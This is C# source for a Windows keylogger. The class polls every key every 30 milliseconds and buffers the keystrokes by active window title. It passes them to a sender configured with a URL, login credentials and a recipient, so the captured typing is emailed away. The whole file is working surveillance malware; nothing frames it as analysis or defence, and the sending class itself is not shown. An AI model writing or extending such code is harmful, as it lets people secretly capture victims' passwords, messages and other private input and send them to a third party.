using System;
using System.Windows.Forms;
using System.Threading;

namespace KeyLogger
{
    class Keylogger
    {
        byte[] keyState = new byte[256];
        string windowName, previousWindowName;
        string buf = "";
        KeyboardMaster keyboardMaster;
        Sender sender;

        public Keylogger(string url, string from_login, string from_pass, string to_login)
        {
            keyboardMaster = new KeyboardMaster();
            sender = new Sender(url, from_login, from_pass, to_login);
        }

        public void Start()
        {
            while (true)
            {
                windowName = WindowsHelper.GetActiveWindowTitle();
                if (windowName != previousWindowName && buf.Length > 0)
                {
                    sender.Add(previousWindowName, buf);
                    buf = "";
                }
                previousWindowName = windowName;
                keyboardMaster.Scan();
                if (keyboardMaster.IsKeyDown(Keys.ControlKey)) continue;
                if (keyboardMaster.IsKeyDown(Keys.LWin)) continue;
                if (keyboardMaster.IsKeyDown(Keys.RWin)) continue;
                if (keyboardMaster.IsKeyDown(Keys.Menu)) continue;
                if (keyboardMaster.IsKeyboardShortcut()) sender.TrySendEmail();
                for (int i = 0; i < 256; i++)
                {
                    if (keyboardMaster.IsKeyDown((Keys)i))
                    {
                        string str = keyboardMaster.KeyToString((Keys)i);
                        if (str == "") continue;
                        Console.WriteLine("[" + str + "]");
                        buf += str;
                    }
                }
                sender.Update();
                Thread.Sleep(30);
            }
        }
    }
}

